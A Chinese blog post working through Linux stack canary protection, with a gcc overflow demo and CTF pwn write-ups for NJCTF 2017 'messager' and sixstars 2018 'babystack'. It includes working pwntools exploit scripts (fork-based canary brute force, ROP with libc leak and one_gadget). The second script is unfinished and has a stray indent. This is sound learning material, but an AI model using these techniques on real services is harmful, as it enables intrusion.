<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>Liunx系统保护 | 0ke</title>
  <meta name="author" content="lijianbo" />

  
  <meta name="description" content="Liunx系统保护" />
  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  <meta property="og:title" content="Liunx系统保护" />
  <meta property="og:site_name" content="0ke" />

  
  

  
    <meta property="og:image" content="" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="0ke" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

<meta name="generator" content="Hexo 6.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">0ke</a></h1>
  <h2><a href="/">Something good must happen in the future</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2021-01-27T02:15:21.000Z"><a href="/2021/01/27/Liunx系统保护/">2021-01-27</a></time>
      
      
  
    <h1 class="title">Liunx系统保护</h1>
  

    </header>
    <div class="entry">
      
        <h2 id="Liunx系统保护"><a href="#Liunx系统保护" class="headerlink" title="Liunx系统保护"></a>Liunx系统保护</h2><span id="more"></span>

<h4 id="Stack-Canaries、"><a href="#Stack-Canaries、" class="headerlink" title="Stack Canaries、"></a>Stack Canaries、</h4><p>​		对下述代码进行试验。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop$ gcc <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector canary<span class="token punctuation">.</span>c <span class="token operator">-</span>o fno<span class="token punctuation">.</span>out              #关闭
lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop$ python <span class="token operator">-</span>c <span class="token string">'print("A"*30)'</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>fno<span class="token punctuation">.</span>out
段错误 <span class="token punctuation">(</span>核心已转储<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop$ gcc <span class="token operator">-</span>fstack<span class="token operator">-</span>protector canary<span class="token punctuation">.</span>c <span class="token operator">-</span>o f<span class="token punctuation">.</span>out					#开启
lijianbo@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop$ python <span class="token operator">-</span>c <span class="token string">'print("A"*30)'</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>f<span class="token punctuation">.</span>out
<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> stack smashing detected <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>f<span class="token punctuation">.</span>out terminated
已放弃 <span class="token punctuation">(</span>核心已转储<span class="token punctuation">)</span>
</code></pre>
<p>​		当开启Canary后程序终止并且提出stack smashing detected，表示检测出了栈溢出。</p>
<pre><code>pwndbg&gt; disassemble main
Dump of assembler code for function main:
   0x00000000004005b6 &lt;+0&gt;:	push   rbp
   0x00000000004005b7 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005ba &lt;+4&gt;:	sub    rsp,0x20
   0x00000000004005be &lt;+8&gt;:	mov    rax,QWORD PTR fs:0x28
   0x00000000004005c7 &lt;+17&gt;:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004005cb &lt;+21&gt;:	xor    eax,eax
   0x00000000004005cd &lt;+23&gt;:	lea    rax,[rbp-0x20]
   0x00000000004005d1 &lt;+27&gt;:	mov    rsi,rax
   0x00000000004005d4 &lt;+30&gt;:	mov    edi,0x400684
   0x00000000004005d9 &lt;+35&gt;:	mov    eax,0x0
   0x00000000004005de &lt;+40&gt;:	call   0x4004a0 &lt;__isoc99_scanf@plt&gt;
   0x00000000004005e3 &lt;+45&gt;:	nop
   0x00000000004005e4 &lt;+46&gt;:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004005e8 &lt;+50&gt;:	xor    rax,QWORD PTR fs:0x28
   0x00000000004005f1 &lt;+59&gt;:	je     0x4005f8 &lt;main+66&gt;
   0x00000000004005f3 &lt;+61&gt;:	call   0x400480 &lt;__stack_chk_fail@plt&gt;
   0x00000000004005f8 &lt;+66&gt;:	leave  
   0x00000000004005f9 &lt;+67&gt;:	ret    
End of assembler dump.
</code></pre>
<p>​		以上是反汇编代码。</p>
<h4 id="NJCTF-2017：messager"><a href="#NJCTF-2017：messager" class="headerlink" title="NJCTF 2017：messager"></a>NJCTF 2017：messager</h4><pre><code>lijianbo@ubuntu:~/Desktop$ checksec messager
[*] &#39;/home/lijianbo/Desktop/messager&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
...
lijianbo@ubuntu:~/Desktop$ chmod 777 messager
lijianbo@ubuntu:~/Desktop$ ./messager
open flag failed: No such file or directory
...
lijianbo@ubuntu:~/Desktop$ echo &quot;FLAG&#123;lijianbo666&#125;&quot; &gt; flag
lijianbo@ubuntu:~/Desktop$ cd messager1
lijianbo@ubuntu:~/Desktop/messager1$ ./messager
[+]start..
[+]socket..
[+]bind..
[+]listen..
liser
</code></pre>
<p>​		因为我只有这个题目的本地文件，好像是要读取一个flag，但是没有flag文件，一会儿托IDA里面看一下，自己写一个进去。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> optval<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>
  __pid_t v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_400B76</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]start.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  addr<span class="token punctuation">.</span>sa_family <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>addr<span class="token punctuation">.</span>sa_data <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">0x15B3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>addr<span class="token punctuation">.</span>sa_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  len <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
  addr_len <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]socket.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dword_602140 <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_602140 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  optval <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token function">setsockopt</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>optval<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]bind.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">bind</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"bind error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]listen.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">listen</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"listen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    fd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>dword_602140<span class="token punctuation">,</span> <span class="token operator">&amp;</span>stru_602130<span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"accept"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">send</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"Welcome!\n"</span><span class="token punctuation">,</span> <span class="token number">9uLL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v5 <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v5 <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400BE9</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">send</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"Message receive failed\n"</span><span class="token punctuation">,</span> <span class="token number">0x19uLL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">send</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"Message received!\n"</span><span class="token punctuation">,</span> <span class="token number">0x12uLL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>​		拖入64位IDA中F5分析程序。跟进sub_400B76和sub_400BE9</p>
<p><img src="/images/3.png"></p>
<p><img src="/images/4.png"></p>
<p>​		在sub_400BE9存在溢出漏洞，s最多0x64，下面尝试输入0x400字节。程序将flag从文件中取出，存放到unk_602160，相应也有一个通过socket发送flag的函数sub_400BC6。</p>
<p>​		在一个while循环中，每次发生链接程序就复刻（fork）一个子程序，然后跳出循环，调用sub_400BE9函数进行交互。如果函数正常返回，打印字符串。（书上原话）</p>
<p>​		通过书上的解释，简要说明就是爆破子进程的canary不会影响主程序，而fork()的调用会把原进程的所有值都复制，相当于克隆自己。给了爆破机会。逐字节爆破。解题代码如下。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">leak_canary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> canary
    canary <span class="token operator">=</span> <span class="token string">"\x00"</span>
    <span class="token keyword">while</span> len<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>
            io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

            io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">104</span> <span class="token operator">+</span> canary <span class="token operator">+</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                canary <span class="token operator">+=</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">finally</span><span class="token punctuation">:</span>
                io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary: 0x%s"</span> <span class="token operator">%</span> canary<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">104</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400bc6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    leak_canary<span class="token punctuation">(</span><span class="token punctuation">)</span>
    pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="sixstars-CTF-2018：babystack【未解决】"><a href="#sixstars-CTF-2018：babystack【未解决】" class="headerlink" title="sixstars CTF 2018：babystack【未解决】"></a>sixstars CTF 2018：babystack【未解决】</h4><p>​		这题涉及到的东西有点多，不光是泄露canary，还有设计栈结构和查着gadget啥的。一点点记录吧。从GitHub上下载题目源码。并编译成开启Full RELRO 、Canary、NX保护的64位程序。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c">https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c</a></p>
<pre><code>lijianbo@ubuntu:~/Desktop/bs1$ gcc -fstack-protector-strong -s -pthread bs.c -o bs -Wl,-z,now,-z,relro
lijianbo@ubuntu:~/Desktop/bs1$ file bs
bs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=41e0dcc65d970cc20028e602bc589baf544bb4ad, stripped
lijianbo@ubuntu:~/Desktop/bs1$ pwn checksec bs
[*] &#39;/home/lijianbo/Desktop/bs1/bs&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>​		ok哈，虽然有源码，但是还是按照管理拖IDA里看一下。</p>
<p><img src="/images/5.png"></p>
<p>​		程序通过pthread_creat()创建线程，运行函数start_routine。跟进start_routine，s存在溢出。</p>
<pre><code>void *__fastcall start_routine(void *a1)
&#123;
  unsigned __int64 v2; // [rsp+8h] [rbp-1018h]
  char s; // [rsp+10h] [rbp-1010h]
  unsigned __int64 v4; // [rsp+1018h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(&amp;s, 0, 0x1000uLL);
  puts(&quot;Welcome to babystack 2018!&quot;);
  puts(&quot;How many bytes do you want to send?&quot;);
  v2 = sub_400906();
  if ( v2 &lt;= 0x10000 )
  &#123;
    sub_400957(0, (__int64)&amp;s, v2);
    puts(&quot;It&#39;s time to say goodbye.&quot;);
  &#125;
  else
  &#123;
    puts(&quot;You are greedy!&quot;);
  &#125;
  return 0LL;
</code></pre>
<p>​		这里书上提到了TLS，稍等具体了解一下TLS，书上的大概意思就是通过pthread_creat()创建的线程，glibc会在内存高地址对TLS进行初始化，从TLS减去固定值得到新线程用于栈寄存器的值。</p>
<p>​		这里给我搞糊涂了，又是创建线程，又是TLS什么的，书上在这道例题前面有介绍TLS，但是晦涩难懂，我尝试找找网上其他关于这部分的解释和pthread_creat()是怎么回事。</p>
<p>​		首先是pthread_creat()，这里有个概念是多线程，早有耳闻，但是不知道啥意思，我一开始以为是C语言的函数，但不是这样的。首先看看百度百科对于线程的解释。<strong>线程是程序中一个单一的顺序控制流程。在单个程序中同时运行多个线程完成不同的工作，称为多线程。线程和进程的区别在于，子进程和<a target="_blank" rel="noopener" href="https://baike.so.com/doc/3943920-4138829.html">父进程</a>有不同的代码和数据空间，而多个线程则共享数据空间，每个线程有自己的执行<a target="_blank" rel="noopener" href="https://baike.so.com/doc/4915223-5133919.html">堆栈</a>和<a target="_blank" rel="noopener" href="https://baike.so.com/doc/5796963-6009758.html">程序计数器</a>为其执行上下文.多线程主要是为了节约CPU时间，发挥利用，根据具体情况而定。线程的运行中需要使用计算机的<a target="_blank" rel="noopener" href="https://baike.so.com/doc/176561-186541.html">内存</a>资源和<a target="_blank" rel="noopener" href="https://baike.so.com/doc/735320-778444.html">CPU</a>。</strong></p>
<p>​		还是晦涩，上张图。</p>
<p><img src="/images/6.png"></p>
<p>​		pthread_create()就是（Unix、Linux、Mac OS X）等操作系统的创建线程的函数。它的功能是<strong>创建线程（实际上就是确定调用该线程函数的入口点）</strong>，在线程创建以后，就开始运行相关的线程函数。pthread_create()的返回值表示成功，返回0；表示出错，返回表示-1。(具体内容查看<a target="_blank" rel="noopener" href="https://blog.csdn.net/wushuomin/article/details/80051295">https://blog.csdn.net/wushuomin/article/details/80051295</a>)</p>
<p>​		这里的TLS不是安全传输层协议，是一个叫线程局部存储（Tread Local Storage）的一个东西。具体细节访问<a target="_blank" rel="noopener" href="https://www.cnblogs.com/stli/archive/2010/11/03/1867852.html">https://www.cnblogs.com/stli/archive/2010/11/03/1867852.html</a></p>
<p>​		这里就说一下他的功能，它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p>
<p>​		讲道理更晕了，先贴上解题代码，这部分有待理解。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

 io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bs"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"bs"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>

pop_rdi <span class="token operator">=</span> <span class="token number">0x400c03</span>
pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x400c01</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>

bss_addr <span class="token operator">=</span> <span class="token number">0x602010</span>

payload  <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x1008</span>
payload <span class="token operator">+=</span> <span class="token string">'\x11'</span><span class="token operator">*</span><span class="token number">0x8</span>									<span class="token comment" spellcheck="true"># canary</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token number">-0x8</span><span class="token punctuation">)</span>							<span class="token comment" spellcheck="true"># rbp</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>			<span class="token comment" spellcheck="true"># rdi = puts@got</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>							<span class="token comment" spellcheck="true"># puts(put@got)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>						<span class="token comment" spellcheck="true"># rdi = 0</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>	<span class="token comment" spellcheck="true"># rsi = bss_addr</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>							<span class="token comment" spellcheck="true"># read(0, bss_addr,)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>				<span class="token comment" spellcheck="true"># mov rsp,rbp ; pop rbp ; pop rip</span>
payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x17e8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'\x11'</span><span class="token operator">*</span><span class="token number">0x8</span>									<span class="token comment" spellcheck="true"># canary</span>
payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"send?\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"goodbye.\n"</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc address: 0x%x"</span> <span class="token operator">%</span> libc_base<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one-gadget: 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#raw_input('###')</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
